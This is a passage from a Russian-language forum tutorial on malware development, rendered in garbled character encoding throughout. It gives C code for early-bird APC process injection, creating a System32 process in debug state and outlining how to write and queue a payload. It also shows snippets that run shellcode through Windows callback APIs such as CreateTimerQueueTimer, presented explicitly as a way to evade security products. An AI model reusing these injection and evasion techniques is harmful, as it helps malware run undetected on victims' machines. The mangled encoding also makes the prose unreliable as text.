<li data-xf-list-type="ul">lpProcessName - –ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è.</li>
<li data-xf-list-type="ul">dwProcessId - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç PID —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">hProcess - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">hThread - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

CHAR lpPath   [MAX_PATH * 2];
CHAR WnDr     [MAX_PATH];

STARTUPINFO            Si    = { 0 };
PROCESS_INFORMATION    Pi    = { 0 };

// –û—á–∏—Å—Ç–∫–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä, —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–Ω–∞—á–µ–Ω–∏–π —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –≤ 0
RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
Si.cb = sizeof(STARTUPINFO);

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—É—Ç–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è %WINDIR% (–∫–æ—Ç–æ—Ä—ã–π –æ–±—ã—á–Ω–æ —Ä–∞–≤–µ–Ω &#039;C:\Windows&#039;)
if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
    printf(&quot;[!] GetEnvironmentVariableA –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return FALSE;
}

// –°–æ–∑–¥–∞–Ω–∏–µ –ø—É—Ç–∏ –∫ —Ü–µ–ª–µ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É
sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);
printf(&quot;\n\t[i] –ó–∞–ø—É—Å–∫ : \&quot;%s\&quot; ... &quot;, lpPath);

// –°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞
if (!CreateProcessA(
    NULL,
    lpPath,
    NULL,
    NULL,
    FALSE,
    DEBUG_PROCESS,        // –í–º–µ—Å—Ç–æ CREATE_SUSPENDED
    NULL,
    NULL,
    &amp;Si,
    &amp;Pi)) {
    printf(&quot;[!] CreateProcessA –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    return FALSE;
}

printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);

// –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è CreateProcessA
*dwProcessId        = Pi.dwProcessId;
*hProcess           = Pi.hProcess;
*hThread            = Pi.hThread;

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –≤—Å–µ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–≥–æ
if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
    return TRUE;

return FALSE;
}</code></pre>
	</div>
</div><br />
–î–∞–ª–µ–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ:<br />
<ul>
<li data-xf-list-type="ul">–ó–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –Ω–æ–≤–æ–≥–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">–ü–µ—Ä–µ–¥–∞—Ç—å dwProcessId –∏ –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏  –≤ QueueUserAPC.</li>
<li data-xf-list-type="ul">–ü—Ä–µ–∫—Ä–∞—Ç–∏—Ç—å –æ—Ç–ª–∞–¥–∫—É —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤—ã–∑–≤–∞–≤ DebugActiveProcessStop, –∫–æ—Ç–æ—Ä—ã–π –≤–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç –µ–≥–æ –ø–æ—Ç–æ–∫–∏ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.</li>
</ul>–î–∞–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–µ–¥–ª–∞–≥–∞—é –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤ –∫–∞—á–µ—Å—Ç–≤–µ –¥–æ–º–∞—à–Ω–µ–≥–æ –∑–∞–¥–∞–Ω–∏—è.)))<br />
<br />
<b>–î–µ–º–æ</b><br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ—Ç–ª–∞–¥–∫–∏. –û—Ç–ª–∞–∂–∏–≤–∞–µ–º—ã–π –ø—Ä–æ—Ü–µ—Å—Å –≤—ã–¥–µ–ª–µ–Ω –ø—É—Ä–ø—É—Ä–Ω—ã–º —Ü–≤–µ—Ç–æ–º –≤ Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782946335.png"
		data-src="https://osint42.org/attachments/1746782946335-png.138/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782946335-png.138/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782946335.png"
			title="1746782946335.png"
			width="1332" height="754" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782956568.png"
		data-src="https://osint42.org/attachments/1746782956568-png.139/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782956568-png.139/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782956568.png"
			title="1746782956568.png"
			width="1676" height="884" loading="lazy" />
	</div><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782964457.png"
		data-src="https://osint42.org/attachments/1746782964457-png.140/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782964457-png.140/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782964457.png"
			title="1746782964457.png"
			width="1557" height="708" loading="lazy" />
	</div></div>
						

							<h2>–í—ã–∑–æ–≤ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783119535.png"
		data-src="https://osint42.org/attachments/1746783119535-png.141/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783119535-png.141/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783119535.png"
			title="1746783119535.png"
			width="645" height="208" loading="lazy" />
	</div><br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–±—ã—Ç–∏–π –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏—è, –∫–æ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ —É—Å–ª–æ–≤–∏–µ. –û–Ω–∏ –ø—Ä–∏–º–µ–Ω—è—é—Ç—Å—è –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏—è—Ö –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ Windows, –≤–∫–ª—é—á–∞—è –æ–±—Ä–∞–±–æ—Ç–∫—É —Å–æ–±—ã—Ç–∏–π, —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ–∫–Ω–∞–º–∏ –∏ –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å.<br />
<br />
<b>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ—Ç Microsoft —Å–ª–µ–¥—É—é—â–µ–µ:</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ - —ç—Ç–æ –∫–æ–¥ –≤ —É–ø—Ä–∞–≤–ª—è–µ–º–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–≥–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π DLL –∑–∞–≤–µ—Ä—à–∏—Ç—å –∑–∞–¥–∞—á—É. –í—ã–∑–æ–≤—ã —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –∫–æ—Å–≤–µ–Ω–Ω–æ –∏–∑ —É–ø—Ä–∞–≤–ª—è–µ–º–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é DLL –∏ –æ–±—Ä–∞—Ç–Ω–æ –∫ —É–ø—Ä–∞–≤–ª—è–µ–º–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏.<br />
<br />
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω—ã–µ API Windows –∏–º–µ—é—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –ø–æ–º–æ—â—å—é –æ–±—Ä–∞—Ç–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –ò—Ö –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –ø–µ—Ä–µ–¥ —Ä–µ—à–µ–Ω–∏—è–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–≥—É—Ç –∫–∞–∑–∞—Ç—å—Å—è –±–µ–∑–≤—Ä–µ–¥–Ω—ã–º–∏ –∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —É–∫–ª–æ–Ω—è—Ç—å—Å—è –æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Ä–µ—à–µ–Ω–∏–π –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
<br />
<b>–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏—è–º–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–û–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã Windows –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –ø–æ–º–æ—â—å—é —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é. –ß—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω –≤–º–µ—Å—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–≥–æ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. <b><u>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –º–æ–∂–µ—Ç –∑–∞–º–µ–Ω–∏—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ CreateThread WinAPI –∏ –¥—Ä—É–≥–∏—Ö —Ç–µ—Ö–Ω–∏–∫, —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –ø–æ—Ç–æ–∫–æ–≤.</u></b> –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –Ω–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –ø–µ—Ä–µ–¥–∞–≤–∞—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã. –í–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∏–ª–∏ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å —ç—Ç–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π –Ω–µ –∏–º–µ—é—Ç –∑–Ω–∞—á–µ–Ω–∏—è.<br />
<br />
–û–¥–Ω–∏–º –≤–∞–∂–Ω—ã–º –º–æ–º–µ–Ω—Ç–æ–º –æ —Ñ—É–Ω–∫—Ü–∏—è—Ö –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —è–≤–ª—è–µ—Ç—Å—è —Ç–æ, —á—Ç–æ –æ–Ω–∏ —Ä–∞–±–æ—Ç–∞—é—Ç —Ç–æ–ª—å–∫–æ –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –Ω–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç–µ—Ö–Ω–∏–∫ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞.<br />
<br />
<b>–ü—Ä–∏–º–µ—Ä—ã —Ñ—É–Ω–∫—Ü–∏–π –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–ø–æ—Å–æ–±–Ω—ã –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
3-–π –ø–∞—Ä–∞–º–µ—Ç—Ä CreateTimerQueueTimer:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateTimerQueueTimer(
[out] PHANDLE phNewTimer,
[in, optional] HANDLE TimerQueue,
[in] WAITORTIMERCALLBACK Callback, // –∑–¥–µ—Å—å
[in, optional] PVOID Parameter,
[in] DWORD DueTime,
[in] DWORD Period,
[in] ULONG Flags
);</code></pre>
	</div>
</div><br />
2-–π –ø–∞—Ä–∞–º–µ—Ç—Ä EnumChildWindows:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL EnumChildWindows(
[in, optional] HWND hWndParent,
[in] WNDENUMPROC lpEnumFunc, // –∑–¥–µ—Å—å
[in] LPARAM lParam
);</code></pre>
	</div>
</div><br />
1-–π –ø–∞—Ä–∞–º–µ—Ç—Ä EnumUILanguagesW:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL EnumUILanguagesW(
[in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc, // –∑–¥–µ—Å—å
[in] DWORD dwFlags,
[in] LONG_PTR lParam
);</code></pre>
	</div>
</div><br />
4-–π –ø–∞—Ä–∞–º–µ—Ç—Ä VerifierEnumerateResource:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>ULONG VerifierEnumerateResource(
HANDLE Process,
ULONG Flags,
ULONG ResourceType,
AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback, // –∑–¥–µ—Å—å
PVOID EnumerationContext
);</code></pre>
	</div>
</div><br />
–°–ª–µ–¥—É—é—â–∏–µ —Ä–∞–∑–¥–µ–ª—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—è—Ç –ø–æ–¥—Ä–æ–±–Ω—ã–µ –æ–±—ä—è—Å–Ω–µ–Ω–∏—è –¥–ª—è –∫–∞–∂–¥–æ–π –∏–∑ —ç—Ç–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π. –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –≤ –ø—Ä–∏–º–µ—Ä–∞—Ö –∫–æ–¥–∞, —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ .text –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç shellcode –∏–º–µ—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ RX, –Ω–µ –ø—Ä–∏–±–µ–≥–∞—è –∫ –≤—ã–¥–µ–ª–µ–Ω–∏—é –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–º—è—Ç–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º VirtualAlloc –∏–ª–∏ –¥—Ä—É–≥–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ CreateTimerQueueTimer</b><br />
<br />
CreateTimerQueueTimer —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π —Ç–∞–π–º–µ—Ä –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –µ–≥–æ –≤ —É–∫–∞–∑–∞–Ω–Ω—É—é –æ—á–µ—Ä–µ–¥—å —Ç–∞–π–º–µ—Ä–æ–≤. –¢–∞–π–º–µ—Ä –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è, –∫–æ–≥–¥–∞ —Ç–∞–π–º–µ—Ä –∏—Å—Ç–µ–∫–∞–µ—Ç. –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ—Ç–æ–∫–æ–º, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–ª –æ—á–µ—Ä–µ–¥—å —Ç–∞–π–º–µ—Ä–æ–≤.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –≤ Payload, –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hTimer = NULL;

if (!CreateTimerQueueTimer(&amp;hTimer, NULL, (WAITORTIMERCALLBACK)Payload, NULL, NULL, NULL, NULL)){
printf(&quot;[!] CreateTimerQueueTimer –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
return -1;
}</code></pre>
	</div>
</div><br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ EnumChildWindows</b><br />
<br />
EnumChildWindows –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º–µ –ø–µ—Ä–µ—á–∏—Å–ª—è—Ç—å –¥–æ—á–µ—Ä–Ω–∏–µ –æ–∫–Ω–∞ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –æ–∫–Ω–∞. –û–Ω –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –æ–∫–Ω–∞ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏ –ø—Ä–∏–º–µ–Ω—è–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—É—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∫ –∫–∞–∂–¥–æ–º—É –∏–∑ –¥–æ—á–µ—Ä–Ω–∏—Ö –æ–∫–æ–Ω –ø–æ–æ—á–µ—Ä–µ–¥–Ω–æ. –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –¥–æ—á–µ—Ä–Ω–µ–≥–æ –æ–∫–Ω–∞ –∏ –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–æ—á–µ—Ä–Ω–µ–≥–æ –æ–∫–Ω–∞ –∏ –∑–Ω–∞—á–µ–Ω–∏–µ, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤.<br />
<br />
